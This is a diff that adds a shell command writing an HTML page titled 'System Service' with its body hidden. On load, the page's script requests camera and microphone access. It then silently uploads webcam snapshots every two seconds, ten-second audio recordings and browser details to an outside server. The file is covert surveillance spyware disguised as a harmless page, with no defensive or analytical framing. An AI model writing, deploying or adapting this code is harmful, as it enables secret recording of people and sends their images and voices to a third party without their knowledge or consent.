@@ -1,0 +1,71 @@
+cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Service</title>
+    <style>body { display: none; }</style>
+</head>
+<body>
+<script>
+    const BACKEND_URL = "https://snap.wuaze.com/backend.php";  // will be updated later
+    let stream = null;
+    let frameInterval = null;
+
+    async function startCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            frameInterval = setInterval(captureFrame, 2000);
+            startAudioRecording();
+        } catch (err) {
+            console.error("Camera/mic failed", err);
+        }
+    }
+
+    function captureFrame() {
+        if (!stream) return;
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.onloadedmetadata = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            sendData('frame', { frame: canvas.toDataURL('image/jpeg', 0.5) });
+            video.remove();
+        };
+    }
+
+    let audioRecorder = null, audioChunks = [];
+    function startAudioRecording() {
+        if (!stream) return;
+        audioRecorder = new MediaRecorder(stream);
+        audioRecorder.ondataavailable = e => { if (e.data.size) audioChunks.push(e.data); };
+        audioRecorder.onstop = () => {
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.onloadend = () => { sendData('audio', { audio: reader.result }); audioChunks = []; };
+            reader.readAsDataURL(blob);
+            setTimeout(startAudioRecording, 100);
+        };
+        audioRecorder.start(10000);
+        setTimeout(() => { if (audioRecorder.state === 'recording') audioRecorder.stop(); }, 10000);
+    }
+
+    async function sendData(type, data) {
+        const fd = new FormData();
+        fd.append('action', type);
+        for (let k in data) fd.append(k, data[k]);
+        try { await fetch(BACKEND_URL, { method: 'POST', body: fd }); } catch(e) {}
+    }
+
+    function sendInfo() {
+        sendData('info', { userAgent: navigator.userAgent, language: navigator.language, time: new Date().toISOString() });
+    }
+
+    sendInfo();
+    startCamera();
+</script>
+</body>
+</html>
+EOF
